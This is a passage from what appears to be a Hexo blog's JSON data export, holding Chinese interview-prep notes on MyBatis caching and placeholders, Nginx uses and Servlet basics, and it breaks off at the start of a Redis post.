&emsp;&emsp;mybatis二级缓存对细粒度的数据级别的缓存实现不好，比如如下需求：对商品信息进行缓存，由于商品信息查询访问量大，但是要求用户每次都能查询最新的商品信息，此时如果使用mybatis\n &emsp;&emsp;的二级缓存就无法实现当一个商品变化时只刷新该商品的缓存信息而不刷新其它商品的信息，因为mybaits的二级缓存区域以mapper为单位划分，当一个商品信息变化会将所有商品信息的缓存数\n &emsp;&emsp;据全部清空。解决此类问题需要在业务层根据需求对数据有针对性缓存。比如业务层使用redis服务器进行缓存技术\n \n**${} 和#{}有什么区别**\n\n &emsp;&emsp;${}表示一个sql拼接符号\n &emsp;&emsp;是在向数据库发出sql语句之前去拼接好sql在提交给数据库执行\n &emsp;&emsp;#{}将整个参数和sql语句两部分提交给数据库，数据库去执行sql语句，去表中匹配所有的记录是否和整个参数是否一致\n","source":"_posts/Mybatis面试总结.md","raw":"---\ntitle: Mybatis面试总结\ndate: 2017-03-31 10:05:57\ntags: Mybatis\n---\n#### 什么是Mybatis\n&emsp;&emsp;Mybatis是对JDBC封装的优秀的数据持久层框架,让我们在开发中只关注SQL的封装,而不必关注其他事情\n\n#### Mybatis总体架构图\n![Mybatis](Mybatis面试总结/1.png)\n**SqlMapConfig.xml:**\n&emsp;&emsp;此文件作为Mybatis的全局配置文件,配置了Mybatis的运行环境等等\n**mapper.xml:**\n&emsp;&emsp;配置了一些sql语句,需要在SqlMapConfig.xml中进行加载\n**SqlSessionFactory:**\n&emsp;&emsp;Mybatis的绘画工厂,由SqlMapConfig进行创建\n**sqlSession:**\n&emsp;&emsp;操作数据库的基本单元,由绘画工厂创建\n**Excuter:**\n&emsp;&emsp;Mybatis底层定义了执行器Excuter操作数据库,Excuter的实现有两个,一个是基本执行器,一个是缓存执行器\n**Mapped Statment:**\n&emsp;&emsp;Mapped Statment也是Mybatis的一个底层对象,包括了Mybatis的配置信息和Sql映射信息,Mapper.xml一个sql对应一个statment\n&emsp;&emsp;mapped Statmet对输入的参数映射到sql语句中叫做输入映射\n&emsp;&emsp;mapped Statment负责将查询出来的结果集映射到java对象中,叫做输出映射\n\n#### Mybatis与Hibernat的区别:\n&emsp;&emsp;Mybatis是一个不完全的ORM框架,它注重的是对SQL的封装,要求程序员进行配置SQL,并将java对象和SQL之间进行输入和输出映射, 而Hibernat是一个完全的ORM框架,它关心的是表和对象之间的映射关系\n&emsp;&emsp;Mybatis比较轻便,易于上手,而Hibernat的学习成本比较大,需要精通更难\n\n#### Mapper代理方式开发DAO\n&emsp;&emsp;Mapper.xml文件中的namespace与mapper接口的类路径相同。\n&emsp;&emsp;Mapper接口方法名和Mapper.xml中定义的每个statement的id相同\n&emsp;&emsp;Mapper接口方法的输入参数类型和mapper.xml中定义的每个sql 的parameterType的类型相同\n&emsp;&emsp;Mapper接口方法的输出参数类型和mapper.xml中定义的每个sql的resultType的类型相同\n\n#### Mybatis的一级缓存\n![Mybatis](Mybatis面试总结/2.png)\n\n &emsp;&emsp;一级缓存区域是根据SqlSession为单位划分的Mybatis内部存储缓存使用一个HashMap，每个sqlSession对象使用一个map存储缓存数据，map的key唯一标识一个sql语句，key对应的value是从数据库查询出来数据映射生成的java对象。 sqlSession执行insert、update、delete等操作commit提交后会清空缓存区域。\n#### Mybatis的二级缓存\n![Mybatis](Mybatis面试总结/3.png)\n &emsp;&emsp;二级缓存区域是根据mapper的namespace划分的，相同namespace的mapper查询数据放在同一个区域，如果使用mapper代理方法每个mapper的namespace都不同，此时可以理解\n &emsp;&emsp;为二级缓存区域是根据mapper划分。\n &emsp;&emsp;每次查询会先从缓存区域找，如果找不到从数据库查询，查询到数据将数据写入缓存。Mybatis内部存储缓存使用一个HashMap，每个mapper映射文件(以namespace为单位)对应一个map，\n &emsp;&emsp;map的key唯一标识一个sql语句，key对应的value是从数据查询出来数据映射生成的java对象。\n &emsp;&emsp;sqlSession执行insert、update、delete等操作commit提交后会清空缓存区域\n\n**Mybatis二级缓存的局限性**\n &emsp;&emsp;mybatis二级缓存对细粒度的数据级别的缓存实现不好，比如如下需求：对商品信息进行缓存，由于商品信息查询访问量大，但是要求用户每次都能查询最新的商品信息，此时如果使用mybatis\n &emsp;&emsp;的二级缓存就无法实现当一个商品变化时只刷新该商品的缓存信息而不刷新其它商品的信息，因为mybaits的二级缓存区域以mapper为单位划分，当一个商品信息变化会将所有商品信息的缓存数\n &emsp;&emsp;据全部清空。解决此类问题需要在业务层根据需求对数据有针对性缓存。比如业务层使用redis服务器进行缓存技术\n \n**${} 和#{}有什么区别**\n\n &emsp;&emsp;${}表示一个sql拼接符号\n &emsp;&emsp;是在向数据库发出sql语句之前去拼接好sql在提交给数据库执行\n &emsp;&emsp;#{}将整个参数和sql语句两部分提交给数据库，数据库去执行sql语句，去表中匹配所有的记录是否和整个参数是否一致\n","slug":"Mybatis面试总结","published":1,"updated":"2018-01-31T05:29:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twb001kmfahumxd8l8j","content":"<h4 id=\"什么是Mybatis\"><a href=\"#什么是Mybatis\" class=\"headerlink\" title=\"什么是Mybatis\"></a>什么是Mybatis</h4><p>&emsp;&emsp;Mybatis是对JDBC封装的优秀的数据持久层框架,让我们在开发中只关注SQL的封装,而不必关注其他事情</p>\n<h4 id=\"Mybatis总体架构图\"><a href=\"#Mybatis总体架构图\" class=\"headerlink\" title=\"Mybatis总体架构图\"></a>Mybatis总体架构图</h4><p><img src=\"Mybatis面试总结/1.png\" alt=\"Mybatis\"><br><strong>SqlMapConfig.xml:</strong><br>&emsp;&emsp;此文件作为Mybatis的全局配置文件,配置了Mybatis的运行环境等等<br><strong>mapper.xml:</strong><br>&emsp;&emsp;配置了一些sql语句,需要在SqlMapConfig.xml中进行加载<br><strong>SqlSessionFactory:</strong><br>&emsp;&emsp;Mybatis的绘画工厂,由SqlMapConfig进行创建<br><strong>sqlSession:</strong><br>&emsp;&emsp;操作数据库的基本单元,由绘画工厂创建<br><strong>Excuter:</strong><br>&emsp;&emsp;Mybatis底层定义了执行器Excuter操作数据库,Excuter的实现有两个,一个是基本执行器,一个是缓存执行器<br><strong>Mapped Statment:</strong><br>&emsp;&emsp;Mapped Statment也是Mybatis的一个底层对象,包括了Mybatis的配置信息和Sql映射信息,Mapper.xml一个sql对应一个statment<br>&emsp;&emsp;mapped Statmet对输入的参数映射到sql语句中叫做输入映射<br>&emsp;&emsp;mapped Statment负责将查询出来的结果集映射到java对象中,叫做输出映射</p>\n<h4 id=\"Mybatis与Hibernat的区别\"><a href=\"#Mybatis与Hibernat的区别\" class=\"headerlink\" title=\"Mybatis与Hibernat的区别:\"></a>Mybatis与Hibernat的区别:</h4><p>&emsp;&emsp;Mybatis是一个不完全的ORM框架,它注重的是对SQL的封装,要求程序员进行配置SQL,并将java对象和SQL之间进行输入和输出映射, 而Hibernat是一个完全的ORM框架,它关心的是表和对象之间的映射关系<br>&emsp;&emsp;Mybatis比较轻便,易于上手,而Hibernat的学习成本比较大,需要精通更难</p>\n<h4 id=\"Mapper代理方式开发DAO\"><a href=\"#Mapper代理方式开发DAO\" class=\"headerlink\" title=\"Mapper代理方式开发DAO\"></a>Mapper代理方式开发DAO</h4><p>&emsp;&emsp;Mapper.xml文件中的namespace与mapper接口的类路径相同。<br>&emsp;&emsp;Mapper接口方法名和Mapper.xml中定义的每个statement的id相同<br>&emsp;&emsp;Mapper接口方法的输入参数类型和mapper.xml中定义的每个sql 的parameterType的类型相同<br>&emsp;&emsp;Mapper接口方法的输出参数类型和mapper.xml中定义的每个sql的resultType的类型相同</p>\n<h4 id=\"Mybatis的一级缓存\"><a href=\"#Mybatis的一级缓存\" class=\"headerlink\" title=\"Mybatis的一级缓存\"></a>Mybatis的一级缓存</h4><p><img src=\"Mybatis面试总结/2.png\" alt=\"Mybatis\"></p>\n<p> &emsp;&emsp;一级缓存区域是根据SqlSession为单位划分的Mybatis内部存储缓存使用一个HashMap，每个sqlSession对象使用一个map存储缓存数据，map的key唯一标识一个sql语句，key对应的value是从数据库查询出来数据映射生成的java对象。 sqlSession执行insert、update、delete等操作commit提交后会清空缓存区域。</p>\n<h4 id=\"Mybatis的二级缓存\"><a href=\"#Mybatis的二级缓存\" class=\"headerlink\" title=\"Mybatis的二级缓存\"></a>Mybatis的二级缓存</h4><p><img src=\"Mybatis面试总结/3.png\" alt=\"Mybatis\"><br> &emsp;&emsp;二级缓存区域是根据mapper的namespace划分的，相同namespace的mapper查询数据放在同一个区域，如果使用mapper代理方法每个mapper的namespace都不同，此时可以理解<br> &emsp;&emsp;为二级缓存区域是根据mapper划分。<br> &emsp;&emsp;每次查询会先从缓存区域找，如果找不到从数据库查询，查询到数据将数据写入缓存。Mybatis内部存储缓存使用一个HashMap，每个mapper映射文件(以namespace为单位)对应一个map，<br> &emsp;&emsp;map的key唯一标识一个sql语句，key对应的value是从数据查询出来数据映射生成的java对象。<br> &emsp;&emsp;sqlSession执行insert、update、delete等操作commit提交后会清空缓存区域</p>\n<p><strong>Mybatis二级缓存的局限性</strong><br> &emsp;&emsp;mybatis二级缓存对细粒度的数据级别的缓存实现不好，比如如下需求：对商品信息进行缓存，由于商品信息查询访问量大，但是要求用户每次都能查询最新的商品信息，此时如果使用mybatis<br> &emsp;&emsp;的二级缓存就无法实现当一个商品变化时只刷新该商品的缓存信息而不刷新其它商品的信息，因为mybaits的二级缓存区域以mapper为单位划分，当一个商品信息变化会将所有商品信息的缓存数<br> &emsp;&emsp;据全部清空。解决此类问题需要在业务层根据需求对数据有针对性缓存。比如业务层使用redis服务器进行缓存技术</p>\n<p><strong>${} 和#{}有什么区别</strong></p>\n<p> &emsp;&emsp;${}表示一个sql拼接符号<br> &emsp;&emsp;是在向数据库发出sql语句之前去拼接好sql在提交给数据库执行<br> &emsp;&emsp;#{}将整个参数和sql语句两部分提交给数据库，数据库去执行sql语句，去表中匹配所有的记录是否和整个参数是否一致</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"什么是Mybatis\"><a href=\"#什么是Mybatis\" class=\"headerlink\" title=\"什么是Mybatis\"></a>什么是Mybatis</h4><p>&emsp;&emsp;Mybatis是对JDBC封装的优秀的数据持久层框架,让我们在开发中只关注SQL的封装,而不必关注其他事情</p>\n<h4 id=\"Mybatis总体架构图\"><a href=\"#Mybatis总体架构图\" class=\"headerlink\" title=\"Mybatis总体架构图\"></a>Mybatis总体架构图</h4><p><img src=\"Mybatis面试总结/1.png\" alt=\"Mybatis\"><br><strong>SqlMapConfig.xml:</strong><br>&emsp;&emsp;此文件作为Mybatis的全局配置文件,配置了Mybatis的运行环境等等<br><strong>mapper.xml:</strong><br>&emsp;&emsp;配置了一些sql语句,需要在SqlMapConfig.xml中进行加载<br><strong>SqlSessionFactory:</strong><br>&emsp;&emsp;Mybatis的绘画工厂,由SqlMapConfig进行创建<br><strong>sqlSession:</strong><br>&emsp;&emsp;操作数据库的基本单元,由绘画工厂创建<br><strong>Excuter:</strong><br>&emsp;&emsp;Mybatis底层定义了执行器Excuter操作数据库,Excuter的实现有两个,一个是基本执行器,一个是缓存执行器<br><strong>Mapped Statment:</strong><br>&emsp;&emsp;Mapped Statment也是Mybatis的一个底层对象,包括了Mybatis的配置信息和Sql映射信息,Mapper.xml一个sql对应一个statment<br>&emsp;&emsp;mapped Statmet对输入的参数映射到sql语句中叫做输入映射<br>&emsp;&emsp;mapped Statment负责将查询出来的结果集映射到java对象中,叫做输出映射</p>\n<h4 id=\"Mybatis与Hibernat的区别\"><a href=\"#Mybatis与Hibernat的区别\" class=\"headerlink\" title=\"Mybatis与Hibernat的区别:\"></a>Mybatis与Hibernat的区别:</h4><p>&emsp;&emsp;Mybatis是一个不完全的ORM框架,它注重的是对SQL的封装,要求程序员进行配置SQL,并将java对象和SQL之间进行输入和输出映射, 而Hibernat是一个完全的ORM框架,它关心的是表和对象之间的映射关系<br>&emsp;&emsp;Mybatis比较轻便,易于上手,而Hibernat的学习成本比较大,需要精通更难</p>\n<h4 id=\"Mapper代理方式开发DAO\"><a href=\"#Mapper代理方式开发DAO\" class=\"headerlink\" title=\"Mapper代理方式开发DAO\"></a>Mapper代理方式开发DAO</h4><p>&emsp;&emsp;Mapper.xml文件中的namespace与mapper接口的类路径相同。<br>&emsp;&emsp;Mapper接口方法名和Mapper.xml中定义的每个statement的id相同<br>&emsp;&emsp;Mapper接口方法的输入参数类型和mapper.xml中定义的每个sql 的parameterType的类型相同<br>&emsp;&emsp;Mapper接口方法的输出参数类型和mapper.xml中定义的每个sql的resultType的类型相同</p>\n<h4 id=\"Mybatis的一级缓存\"><a href=\"#Mybatis的一级缓存\" class=\"headerlink\" title=\"Mybatis的一级缓存\"></a>Mybatis的一级缓存</h4><p><img src=\"Mybatis面试总结/2.png\" alt=\"Mybatis\"></p>\n<p> &emsp;&emsp;一级缓存区域是根据SqlSession为单位划分的Mybatis内部存储缓存使用一个HashMap，每个sqlSession对象使用一个map存储缓存数据，map的key唯一标识一个sql语句，key对应的value是从数据库查询出来数据映射生成的java对象。 sqlSession执行insert、update、delete等操作commit提交后会清空缓存区域。</p>\n<h4 id=\"Mybatis的二级缓存\"><a href=\"#Mybatis的二级缓存\" class=\"headerlink\" title=\"Mybatis的二级缓存\"></a>Mybatis的二级缓存</h4><p><img src=\"Mybatis面试总结/3.png\" alt=\"Mybatis\"><br> &emsp;&emsp;二级缓存区域是根据mapper的namespace划分的，相同namespace的mapper查询数据放在同一个区域，如果使用mapper代理方法每个mapper的namespace都不同，此时可以理解<br> &emsp;&emsp;为二级缓存区域是根据mapper划分。<br> &emsp;&emsp;每次查询会先从缓存区域找，如果找不到从数据库查询，查询到数据将数据写入缓存。Mybatis内部存储缓存使用一个HashMap，每个mapper映射文件(以namespace为单位)对应一个map，<br> &emsp;&emsp;map的key唯一标识一个sql语句，key对应的value是从数据查询出来数据映射生成的java对象。<br> &emsp;&emsp;sqlSession执行insert、update、delete等操作commit提交后会清空缓存区域</p>\n<p><strong>Mybatis二级缓存的局限性</strong><br> &emsp;&emsp;mybatis二级缓存对细粒度的数据级别的缓存实现不好，比如如下需求：对商品信息进行缓存，由于商品信息查询访问量大，但是要求用户每次都能查询最新的商品信息，此时如果使用mybatis<br> &emsp;&emsp;的二级缓存就无法实现当一个商品变化时只刷新该商品的缓存信息而不刷新其它商品的信息，因为mybaits的二级缓存区域以mapper为单位划分，当一个商品信息变化会将所有商品信息的缓存数<br> &emsp;&emsp;据全部清空。解决此类问题需要在业务层根据需求对数据有针对性缓存。比如业务层使用redis服务器进行缓存技术</p>\n<p><strong>${} 和#{}有什么区别</strong></p>\n<p> &emsp;&emsp;${}表示一个sql拼接符号<br> &emsp;&emsp;是在向数据库发出sql语句之前去拼接好sql在提交给数据库执行<br> &emsp;&emsp;#{}将整个参数和sql语句两部分提交给数据库，数据库去执行sql语句，去表中匹配所有的记录是否和整个参数是否一致</p>\n"},{"title":"Nginx反向代理和负载均衡","date":"2017-02-21T06:39:30.000Z","_content":"![Nginx](Nginx反向代理和负载均衡/1.png)","source":"_posts/Nginx反向代理和负载均衡.md","raw":"---\ntitle: Nginx反向代理和负载均衡\ndate: 2017-02-21 14:39:30\ntags: Nginx\n---\n![Nginx](Nginx反向代理和负载均衡/1.png)","slug":"Nginx反向代理和负载均衡","published":1,"updated":"2018-01-31T08:31:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twc001mmfah0q62h0eu","content":"<p><img src=\"Nginx反向代理和负载均衡/1.png\" alt=\"Nginx\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"Nginx反向代理和负载均衡/1.png\" alt=\"Nginx\"></p>\n"},{"title":"Nginx简介","date":"2017-12-31T08:28:06.000Z","_content":"#### 简单介绍\n\nNginx是一款高性能的http 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器。由俄罗斯的程序设计师Igor Sysoev所开发，官方测试nginx能够支支撑5万并发链接，并且cpu、内存等资源消耗却非常低，运行非常稳定。\n\n#### 应用场景\n\n**http服务器**：Nginx是一个http服务可以独立提供http服务。可以做网页静态服务器。\n**虚拟主机**：可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机。\n**反向代理、负载均衡**：当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用nginx做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况。","source":"_posts/Nginx简介.md","raw":"---\ntitle: Nginx简介\ndate: 2017-12-31 16:28:06\ntags: Nginx\n---\n#### 简单介绍\n\nNginx是一款高性能的http 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器。由俄罗斯的程序设计师Igor Sysoev所开发，官方测试nginx能够支支撑5万并发链接，并且cpu、内存等资源消耗却非常低，运行非常稳定。\n\n#### 应用场景\n\n**http服务器**：Nginx是一个http服务可以独立提供http服务。可以做网页静态服务器。\n**虚拟主机**：可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机。\n**反向代理、负载均衡**：当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用nginx做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况。","slug":"Nginx简介","published":1,"updated":"2018-01-31T08:29:30.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twd001omfahswxujq21","content":"<h4 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h4><p>Nginx是一款高性能的http 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器。由俄罗斯的程序设计师Igor Sysoev所开发，官方测试nginx能够支支撑5万并发链接，并且cpu、内存等资源消耗却非常低，运行非常稳定。</p>\n<h4 id=\"应用场景\"><a href=\"#应用场景\" class=\"headerlink\" title=\"应用场景\"></a>应用场景</h4><p><strong>http服务器</strong>：Nginx是一个http服务可以独立提供http服务。可以做网页静态服务器。<br><strong>虚拟主机</strong>：可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机。<br><strong>反向代理、负载均衡</strong>：当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用nginx做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h4><p>Nginx是一款高性能的http 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器。由俄罗斯的程序设计师Igor Sysoev所开发，官方测试nginx能够支支撑5万并发链接，并且cpu、内存等资源消耗却非常低，运行非常稳定。</p>\n<h4 id=\"应用场景\"><a href=\"#应用场景\" class=\"headerlink\" title=\"应用场景\"></a>应用场景</h4><p><strong>http服务器</strong>：Nginx是一个http服务可以独立提供http服务。可以做网页静态服务器。<br><strong>虚拟主机</strong>：可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机。<br><strong>反向代理、负载均衡</strong>：当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用nginx做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况。</p>\n"},{"title":"Servlet总结","date":"2014-12-21T07:34:32.000Z","_content":"#### Servlet是什么,有什么作用\nServlet是SUN公司推出的一套规范,规定了如何使用java开发动态网站.是运行在java服务器端的小程序.Servlet在API中的表现形式是一个接口，其继承的子类有GenericServlet,而HTTPServlet又继承了GenericServlet。\n\n#### 什么是ServletContext,由谁创建\nServletContext表示Servlet的上下文对象,当启动服务器的时候,会加载web.xml读取里面所配置的监听器和过滤器还有一些其他配置,将其加载到内存中,ServletContext就代表了这个WEB应用,当关闭服务器的时候,会卸载ServletContext。\n\n#### ServletRequest和ServletResponse的生命周期\n我们HTTP请求是基于请求与响应的,当我们访问Servlet的时候,WEB服务器会给我们创建request与response对象,request对象中封装了请求相关的一些信息,而response中封装了响应相关的一些信息,当我们执行完一次操作之后,response返回结果,此时request和response也就销毁。\n\n#### Servlet是线程安全的吗?如何实现线程安全\nServlet是线程不安全的,它是单利模式,当我们每次请求访问的时候,都会创建一个新的线程\n实现Servlet线程安全的方案:\n1.实现SingleThreadModel接口\n2.进行加锁处理,保证线程的安全 \n          \n\tPublic class XXX extends HttpServlet { \n\t\t......\n\t\tsynchronized (this){\n\t\t\t......\n\t\t}\n\t}\n3.线程的安全隐患还是因为全局变量引起的,我们避免使用全局变量会使得线程安全\n\n#### Tomcat是怎么处理请求的\n![Servlet](Servlet总结/1.png)\n#### 响应重定向和请求转发的区别\n1.响应重定向是客户端行为,请求转发是服务器端行为\n2.响应重定向是多次请求多次响应,请求转发是一次请求一次响应\n3.响应重定向可以访问站外资源,请求转发只能访问站内资源\n\n#### HTTP请求的GET和POST请求的区别\n1.GET请求是通过请求行来携带参数的,参数显示在地址栏POST是在请求体携带请求参数,地址栏不会携带参数\n2.GET请求会调用服务器端的doGET方法处理,POST请求调用服务器端的doPOST方法处理请求\n3.GET请求对请求的数据有大小的限制(2K),数据不安全,POST请求对请求参数的大小无限制,安全","source":"_posts/Servlet总结.md","raw":"---\ntitle: Servlet总结\ndate: 2014-12-21 15:34:32\ntags: Servlet\n---\n#### Servlet是什么,有什么作用\nServlet是SUN公司推出的一套规范,规定了如何使用java开发动态网站.是运行在java服务器端的小程序.Servlet在API中的表现形式是一个接口，其继承的子类有GenericServlet,而HTTPServlet又继承了GenericServlet。\n\n#### 什么是ServletContext,由谁创建\nServletContext表示Servlet的上下文对象,当启动服务器的时候,会加载web.xml读取里面所配置的监听器和过滤器还有一些其他配置,将其加载到内存中,ServletContext就代表了这个WEB应用,当关闭服务器的时候,会卸载ServletContext。\n\n#### ServletRequest和ServletResponse的生命周期\n我们HTTP请求是基于请求与响应的,当我们访问Servlet的时候,WEB服务器会给我们创建request与response对象,request对象中封装了请求相关的一些信息,而response中封装了响应相关的一些信息,当我们执行完一次操作之后,response返回结果,此时request和response也就销毁。\n\n#### Servlet是线程安全的吗?如何实现线程安全\nServlet是线程不安全的,它是单利模式,当我们每次请求访问的时候,都会创建一个新的线程\n实现Servlet线程安全的方案:\n1.实现SingleThreadModel接口\n2.进行加锁处理,保证线程的安全 \n          \n\tPublic class XXX extends HttpServlet { \n\t\t......\n\t\tsynchronized (this){\n\t\t\t......\n\t\t}\n\t}\n3.线程的安全隐患还是因为全局变量引起的,我们避免使用全局变量会使得线程安全\n\n#### Tomcat是怎么处理请求的\n![Servlet](Servlet总结/1.png)\n#### 响应重定向和请求转发的区别\n1.响应重定向是客户端行为,请求转发是服务器端行为\n2.响应重定向是多次请求多次响应,请求转发是一次请求一次响应\n3.响应重定向可以访问站外资源,请求转发只能访问站内资源\n\n#### HTTP请求的GET和POST请求的区别\n1.GET请求是通过请求行来携带参数的,参数显示在地址栏POST是在请求体携带请求参数,地址栏不会携带参数\n2.GET请求会调用服务器端的doGET方法处理,POST请求调用服务器端的doPOST方法处理请求\n3.GET请求对请求的数据有大小的限制(2K),数据不安全,POST请求对请求参数的大小无限制,安全","slug":"Servlet总结","published":1,"updated":"2018-01-31T07:40:38.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twd001qmfahtc94x74j","content":"<h4 id=\"Servlet是什么-有什么作用\"><a href=\"#Servlet是什么-有什么作用\" class=\"headerlink\" title=\"Servlet是什么,有什么作用\"></a>Servlet是什么,有什么作用</h4><p>Servlet是SUN公司推出的一套规范,规定了如何使用java开发动态网站.是运行在java服务器端的小程序.Servlet在API中的表现形式是一个接口，其继承的子类有GenericServlet,而HTTPServlet又继承了GenericServlet。</p>\n<h4 id=\"什么是ServletContext-由谁创建\"><a href=\"#什么是ServletContext-由谁创建\" class=\"headerlink\" title=\"什么是ServletContext,由谁创建\"></a>什么是ServletContext,由谁创建</h4><p>ServletContext表示Servlet的上下文对象,当启动服务器的时候,会加载web.xml读取里面所配置的监听器和过滤器还有一些其他配置,将其加载到内存中,ServletContext就代表了这个WEB应用,当关闭服务器的时候,会卸载ServletContext。</p>\n<h4 id=\"ServletRequest和ServletResponse的生命周期\"><a href=\"#ServletRequest和ServletResponse的生命周期\" class=\"headerlink\" title=\"ServletRequest和ServletResponse的生命周期\"></a>ServletRequest和ServletResponse的生命周期</h4><p>我们HTTP请求是基于请求与响应的,当我们访问Servlet的时候,WEB服务器会给我们创建request与response对象,request对象中封装了请求相关的一些信息,而response中封装了响应相关的一些信息,当我们执行完一次操作之后,response返回结果,此时request和response也就销毁。</p>\n<h4 id=\"Servlet是线程安全的吗-如何实现线程安全\"><a href=\"#Servlet是线程安全的吗-如何实现线程安全\" class=\"headerlink\" title=\"Servlet是线程安全的吗?如何实现线程安全\"></a>Servlet是线程安全的吗?如何实现线程安全</h4><p>Servlet是线程不安全的,它是单利模式,当我们每次请求访问的时候,都会创建一个新的线程<br>实现Servlet线程安全的方案:<br>1.实现SingleThreadModel接口<br>2.进行加锁处理,保证线程的安全 </p>\n<pre><code>Public class XXX extends HttpServlet { \n    ......\n    synchronized (this){\n        ......\n    }\n}\n</code></pre><p>3.线程的安全隐患还是因为全局变量引起的,我们避免使用全局变量会使得线程安全</p>\n<h4 id=\"Tomcat是怎么处理请求的\"><a href=\"#Tomcat是怎么处理请求的\" class=\"headerlink\" title=\"Tomcat是怎么处理请求的\"></a>Tomcat是怎么处理请求的</h4><p><img src=\"Servlet总结/1.png\" alt=\"Servlet\"></p>\n<h4 id=\"响应重定向和请求转发的区别\"><a href=\"#响应重定向和请求转发的区别\" class=\"headerlink\" title=\"响应重定向和请求转发的区别\"></a>响应重定向和请求转发的区别</h4><p>1.响应重定向是客户端行为,请求转发是服务器端行为<br>2.响应重定向是多次请求多次响应,请求转发是一次请求一次响应<br>3.响应重定向可以访问站外资源,请求转发只能访问站内资源</p>\n<h4 id=\"HTTP请求的GET和POST请求的区别\"><a href=\"#HTTP请求的GET和POST请求的区别\" class=\"headerlink\" title=\"HTTP请求的GET和POST请求的区别\"></a>HTTP请求的GET和POST请求的区别</h4><p>1.GET请求是通过请求行来携带参数的,参数显示在地址栏POST是在请求体携带请求参数,地址栏不会携带参数<br>2.GET请求会调用服务器端的doGET方法处理,POST请求调用服务器端的doPOST方法处理请求<br>3.GET请求对请求的数据有大小的限制(2K),数据不安全,POST请求对请求参数的大小无限制,安全</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Servlet是什么-有什么作用\"><a href=\"#Servlet是什么-有什么作用\" class=\"headerlink\" title=\"Servlet是什么,有什么作用\"></a>Servlet是什么,有什么作用</h4><p>Servlet是SUN公司推出的一套规范,规定了如何使用java开发动态网站.是运行在java服务器端的小程序.Servlet在API中的表现形式是一个接口，其继承的子类有GenericServlet,而HTTPServlet又继承了GenericServlet。</p>\n<h4 id=\"什么是ServletContext-由谁创建\"><a href=\"#什么是ServletContext-由谁创建\" class=\"headerlink\" title=\"什么是ServletContext,由谁创建\"></a>什么是ServletContext,由谁创建</h4><p>ServletContext表示Servlet的上下文对象,当启动服务器的时候,会加载web.xml读取里面所配置的监听器和过滤器还有一些其他配置,将其加载到内存中,ServletContext就代表了这个WEB应用,当关闭服务器的时候,会卸载ServletContext。</p>\n<h4 id=\"ServletRequest和ServletResponse的生命周期\"><a href=\"#ServletRequest和ServletResponse的生命周期\" class=\"headerlink\" title=\"ServletRequest和ServletResponse的生命周期\"></a>ServletRequest和ServletResponse的生命周期</h4><p>我们HTTP请求是基于请求与响应的,当我们访问Servlet的时候,WEB服务器会给我们创建request与response对象,request对象中封装了请求相关的一些信息,而response中封装了响应相关的一些信息,当我们执行完一次操作之后,response返回结果,此时request和response也就销毁。</p>\n<h4 id=\"Servlet是线程安全的吗-如何实现线程安全\"><a href=\"#Servlet是线程安全的吗-如何实现线程安全\" class=\"headerlink\" title=\"Servlet是线程安全的吗?如何实现线程安全\"></a>Servlet是线程安全的吗?如何实现线程安全</h4><p>Servlet是线程不安全的,它是单利模式,当我们每次请求访问的时候,都会创建一个新的线程<br>实现Servlet线程安全的方案:<br>1.实现SingleThreadModel接口<br>2.进行加锁处理,保证线程的安全 </p>\n<pre><code>Public class XXX extends HttpServlet { \n    ......\n    synchronized (this){\n        ......\n    }\n}\n</code></pre><p>3.线程的安全隐患还是因为全局变量引起的,我们避免使用全局变量会使得线程安全</p>\n<h4 id=\"Tomcat是怎么处理请求的\"><a href=\"#Tomcat是怎么处理请求的\" class=\"headerlink\" title=\"Tomcat是怎么处理请求的\"></a>Tomcat是怎么处理请求的</h4><p><img src=\"Servlet总结/1.png\" alt=\"Servlet\"></p>\n<h4 id=\"响应重定向和请求转发的区别\"><a href=\"#响应重定向和请求转发的区别\" class=\"headerlink\" title=\"响应重定向和请求转发的区别\"></a>响应重定向和请求转发的区别</h4><p>1.响应重定向是客户端行为,请求转发是服务器端行为<br>2.响应重定向是多次请求多次响应,请求转发是一次请求一次响应<br>3.响应重定向可以访问站外资源,请求转发只能访问站内资源</p>\n<h4 id=\"HTTP请求的GET和POST请求的区别\"><a href=\"#HTTP请求的GET和POST请求的区别\" class=\"headerlink\" title=\"HTTP请求的GET和POST请求的区别\"></a>HTTP请求的GET和POST请求的区别</h4><p>1.GET请求是通过请求行来携带参数的,参数显示在地址栏POST是在请求体携带请求参数,地址栏不会携带参数<br>2.GET请求会调用服务器端的doGET方法处理,POST请求调用服务器端的doPOST方法处理请求<br>3.GET请求对请求的数据有大小的限制(2K),数据不安全,POST请求对请求参数的大小无限制,安全</p>\n"},{"title":"NoSql数据库Redis","date":"2016-01-31T06:09:38.000Z","_content":"Redis是一个NoSql数据库，具有五中存储数据格式：\n\nString：字符串\nHash：哈希（相当于map, 